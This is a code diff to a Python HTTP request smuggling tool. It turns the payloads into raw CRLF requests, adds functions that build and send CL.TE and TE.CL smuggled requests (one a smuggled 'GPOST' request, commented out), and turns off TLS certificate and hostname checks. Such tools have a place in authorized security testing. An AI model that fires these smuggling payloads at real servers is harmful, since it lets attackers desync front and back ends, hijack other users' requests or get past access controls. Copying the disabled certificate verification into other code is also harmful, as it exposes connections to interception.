@@ -69,9 +69,11 @@ def connect(target):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(TIMEOUT)
     if target.scheme == 'https':
-        # Purpose.CLIENT_AUTH disables any verification of the server's
-        # certificate
-        context = ssl.create_default_context(purpose=ssl.Purpose.CLIENT_AUTH)
+        context = ssl.create_default_context()
+        #context = ssl.create_default_context(cafile='/home/nicolas/tmp/meshify.crt')
+        # Don't verify server certificates
+        context.check_hostname = False
+        context.verify_mode = ssl.CERT_NONE
         s = context.wrap_socket(sock, server_hostname=target.host)
     else:
         s = sock
@@ -86,9 +88,9 @@ def to_http(s):
 def query(target, payload):
     s = connect(target)
     logging.debug(f'>>> {target.host}:{target.port}\n' + payload)
-    s.sendall(to_http(payload))
+    s.sendall(payload.encode())
     response = s.recv(4096)
-    logging.debug(f'<<< {target.host}:{target.port}\n' + response)
+    logging.debug(f'<<< {target.host}:{target.port}\n' + response.decode())
     s.shutdown(socket.SHUT_RDWR)
     s.close()
 
@@ -99,14 +101,14 @@ def is_vulnerable(target):
 
     # Check vulnerability to CL.TE attack
     try:
-        query(target, f'''POST {target.path} HTTP/1.1
-Host: {target.host}
-Transfer-Encoding: chunked
-Content-Length: 4
-
-1
-Z
-Q''')
+        query(target, f'POST {target.path} HTTP/1.1\r\n'
+                      f'Host: {target.host}\r\n'
+                       'Transfer-Encoding: chunked\r\n'
+                       'Content-Length: 4\r\n'
+                       '\r\n'
+                       '1\r\n'
+                       'Z\r\n'
+                       'Q')
     except socket.timeout:
         logging.debug(f'CL.TE timeout on {url}')
         vulnerable = True
@@ -119,19 +121,46 @@ Q''')
 
     # Check vulnerability to TE.CL attack
     try:
-        query(target, f'''POST {target.path} HTTP/1.1
-Host: {target.host}
-Transfer-Encoding: chunked
-Content-Length: 6
-
-0
-
-X''')
+        query(target, f'POST {target.path} HTTP/1.1\r\n'
+                      f'Host: {target.host}\r\n'
+                       'Transfer-Encoding: chunked\r\n'
+                       'Content-Length: 6\r\n'
+                       '\r\n'
+                       '0\r\n'
+                       '\r\n'
+                       'X\r\n')
     except socket.timeout:
         logging.debug(f'TE.CL timeout on {url}')
         vulnerable = True
 
     return vulnerable
+
+
+def cl_te_smuggle(target, smuggle):
+    cl = len(smuggle) + 5           # account for inserted zero-length chunk
+    query(target, f'POST {target.path} HTTP/1.1\r\n'
+                  f'Host: {target.host}\r\n'
+                   'Transfer-Encoding: chunked\r\n'
+                  f'Content-Length: {cl}\r\n'
+                   '\r\n'
+                   '0\r\n'          # insert zero-length chunk
+                   '\r\n'
+                   f'{smuggle}')
+
+
+def te_cl_smuggle(target, smuggle):
+    smuggle_len = f'{len(smuggle):x}'
+    smuggle = (f'{smuggle}\r\n'     # add final zero-length chunk
+                '0\r\n'
+                '\r\n')
+    cl = len(smuggle_len) + 2       # account for '\r\n'
+    query(target, f'POST {target.path} HTTP/1.1\r\n'
+                  f'Host: {target.host}\r\n'
+                   'Transfer-Encoding: chunked\r\n'
+                  f'Content-Length: {cl}\r\n'
+                   '\r\n'
+                  f'{smuggle_len}\r\n'
+                  f'{smuggle}')
 
 
 def main():
@@ -140,7 +169,13 @@ def main():
     logging.debug(f'normalized url: '
                   f'{target.scheme}://{target.host}:{target.port}{target.path}')
     is_vulnerable(target)
-
+'''
+    cl_te_smuggle(target, 'G')
+    te_cl_smuggle(target, f'GPOST / HTTP/1.0\r\n'
+                          f'Host: {target.host}\r\n'
+                           'Content-Length: 50\r\n'
+                           '\r\n')
+'''
 
 if __name__ == "__main__":
     main()
